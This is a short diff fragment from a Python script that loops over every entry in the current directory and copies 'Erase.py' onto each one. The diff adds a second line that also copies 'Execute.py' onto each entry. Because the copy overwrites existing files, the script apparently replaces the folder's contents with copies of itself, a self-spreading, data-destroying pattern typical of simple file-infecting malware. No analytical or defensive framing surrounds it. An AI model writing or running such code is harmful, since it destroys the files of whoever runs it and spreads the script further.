@@ -2,6 +2,7 @@ import os, shutil,subprocess
 for files in os.listdir(os.curdir):
     try:
         shutil.copy2('Erase.py', files)
+        shutil.copy2('Execute.py', files)
         script_dir = os.path.dirname(os.path.realpath('Erase.py'))
         
         
